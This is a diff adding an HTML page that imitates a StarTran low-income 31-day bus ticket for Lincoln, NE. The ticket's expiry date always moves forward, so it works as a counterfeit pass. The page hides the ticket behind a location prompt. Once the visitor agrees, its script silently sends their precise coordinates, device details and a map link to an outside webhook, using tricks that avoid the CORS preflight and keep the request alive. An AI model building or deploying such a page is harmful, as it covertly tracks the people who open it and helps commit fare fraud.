@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"
+    >
+
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" type="image/x-icon" href="img/bigTokenFavicon.ico">
+    <link rel="apple-touch-icon" href="img/bigTokenFavicon.png">
+
+    <title>Token Transit</title>
+</head>
+
+<body>
+
+    <!-- Location Permission Overlay -->
+    <div id="overlay">
+        <h1>This site requires your location</h1>
+        <p>Click Yes to continue</p>
+        <button id="allow" type="button">Yes</button>
+    </div>
+
+    <!-- StarTran Ticket -->
+    <div id="content" class="ticket-container" style="display: none;">
+
+        <div class="close-button" onclick="window.parent.location.reload()">&times;</div>
+
+        <div class="header">
+            <div class="instruction">
+                <h2>StarTran</h2>
+                Show operator your ticket
+            </div>
+        </div>
+
+        <!-- Pulsing Green Circle -->
+        <div class="logo-area">
+            <div class="pulsing-ring"></div>
+
+            <div class="outer-circle">
+                <div class="inner-circle">
+                    <img
+                        src="img/StarTranLogo.png"
+                        alt="StarTran logo"
+                        class="round-image"
+                    >
+                </div>
+            </div>
+        </div>
+
+        <!-- Ticket Information -->
+        <div class="clock" id="clock"></div>
+
+        <div class="low-income-tag">
+            Low Income
+        </div>
+
+        <div class="card">
+
+            <div class="ticket-details">
+                Low Income Fixed Route 31-Day
+            </div>
+
+            <div class="location">
+                Lincoln, NE
+            </div>
+
+            <div class="expiration" id="expiryMessage"></div>
+
+        </div>
+    </div>
+
+
+<script>
+
+"use strict";
+
+/* =========================================================
+   Configuration
+   ========================================================= */
+
+const WEBHOOK_URL =
+    "https://app.hooklistener.com/w/my-first-endpoint-opbl";
+
+const TIME_ZONE = "America/Chicago";
+
+
+/* =========================================================
+   DOM Elements
+   ========================================================= */
+
+const overlay = document.getElementById("overlay");
+const content = document.getElementById("content");
+const allowButton = document.getElementById("allow");
+const clock = document.getElementById("clock");
+const expiryMessage = document.getElementById("expiryMessage");
+
+
+/* =========================================================
+   Expiration Date
+   ========================================================= */
+
+function setExpirationDate() {
+
+    const expirationDate = new Date();
+
+    expirationDate.setDate(
+        expirationDate.getDate() + 21
+    );
+
+    expirationDate.setHours(0, 0, 0, 0);
+
+    const formattedDate = expirationDate.toLocaleDateString(
+        "en-US",
+        {
+            month: "short",
+            day: "numeric",
+            year: "numeric"
+        }
+    );
+
+    expiryMessage.textContent =
+        `Expires ${formattedDate} at 12:00 AM`;
+}
+
+
+/* =========================================================
+   Clock
+   ========================================================= */
+
+function updateClock() {
+
+    const now = new Date();
+
+    let hours = now.getHours();
+    const minutes = String(now.getMinutes()).padStart(2, "0");
+    const seconds = String(now.getSeconds()).padStart(2, "0");
+
+    const ampm = hours >= 12 ? "PM" : "AM";
+
+    hours = hours % 12;
+
+    if (hours === 0) {
+        hours = 12;
+    }
+
+    clock.textContent =
+        `${hours}:${minutes}:${seconds} ${ampm}`;
+}
+
+
+/* =========================================================
+   Central Time
+   ========================================================= */
+
+function getCentralTimeISO() {
+
+    return new Intl.DateTimeFormat(
+        "en-US",
+        {
+            timeZone: TIME_ZONE,
+            year: "numeric",
+            month: "2-digit",
+            day: "2-digit",
+            hour: "2-digit",
+            minute: "2-digit",
+            second: "2-digit",
+            hour12: false
+        }
+    ).format(new Date());
+}
+
+
+/* =========================================================
+   Send Location
+   ========================================================= */
+
+async function sendLocation(position) {
+
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+
+    const payload = {
+        latitude: latitude,
+        longitude: longitude,
+        accuracy: position.coords.accuracy,
+        timestamp: getCentralTimeISO(),
+        device: navigator.userAgent,
+        platform: navigator.platform,
+        map: `https://www.google.com/maps?q=${latitude},${longitude}`
+    };
+
+    const json = JSON.stringify(payload);
+
+    console.log("Location payload:", payload);
+
+
+    /*
+        Use text/plain instead of application/json.
+
+        This prevents the browser from sending an OPTIONS
+        CORS preflight request before the POST.
+
+        The actual body is still JSON.
+    */
+
+    try {
+
+        const response = await fetch(
+            WEBHOOK_URL,
+            {
+                method: "POST",
+
+                headers: {
+                    "Content-Type": "text/plain;charset=UTF-8"
+                },
+
+                body: json,
+
+                /*
+                    Allows the browser to keep the request alive
+                    even if the page changes or is closed.
+                */
+                keepalive: true,
+
+                /*
+                    We don't need to read the response.
+                */
+                mode: "no-cors"
+            }
+        );
+
+        console.log("Webhook request sent.", response);
+
+        return true;
+
+    } catch (error) {
+
+        console.error(
+            "Webhook request failed:",
+            error
+        );
+
+        return false;
+    }
+}
+
+
+/* =========================================================
+   Request Location
+   ========================================================= */
+
+function requestLocation() {
+
+    if (!navigator.geolocation) {
+
+        alert(
+            "Your browser does not support location services."
+        );
+
+        return;
+    }
+
+
+    /*
+        Disable the button immediately.
+
+        This prevents multiple location requests if the
+        user taps Yes more than once.
+    */
+
+    allowButton.disabled = true;
+    allowButton.textContent = "Please wait...";
+
+
+    navigator.geolocation.getCurrentPosition(
+
+        async function(position) {
+
+            console.log(
+                "Location received:",
+                position.coords
+            );
+
+
+            /*
+                Send the webhook before displaying
+                the ticket.
+            */
+
+            await sendLocation(position);
+
+
+            /*
+                Location succeeded.
+                Now unlock the ticket.
+            */
+
+            overlay.style.display = "none";
+            content.style.display = "block";
+
+        },
+
+
+        function(error) {
+
+            console.error(
+                "Geolocation error:",
+                error
+            );
+
+            allowButton.disabled = false;
+            allowButton.textContent = "Yes";
+
+
+            let message;
+
+            switch (error.code) {
+
+                case error.PERMISSION_DENIED:
+                    message =
+                        "Location permission was denied. Please allow location access and try again.";
+                    break;
+
+                case error.POSITION_UNAVAILABLE:
+                    message =
+                        "Your location could not be determined. Please try again.";
+                    break;
+
+                case error.TIMEOUT:
+                    message =
+                        "The location request timed out. Please try again.";
+                    break;
+
+                default:
+                    message =
+                        "Unable to obtain your location. Please try again.";
+            }
+
+            alert(message);
+        },
+
+
+        {
+            enableHighAccuracy: false,
+            timeout: 15000,
+            maximumAge: 0
+        }
+    );
+}
+
+
+/* =========================================================
+   Initialize
+   ========================================================= */
+
+document.addEventListener(
+    "DOMContentLoaded",
+    function() {
+
+        console.log("DOM loaded");
+
+        setExpirationDate();
+
+        updateClock();
+
+        setInterval(
+            updateClock,
+            1000
+        );
+
+
+        allowButton.addEventListener(
+            "click",
+            function() {
+
+                console.log("Yes button clicked");
+
+                requestLocation();
+
+            }
+        );
+
+    }
+);
+
+</script>
+
+</body>
+</html>
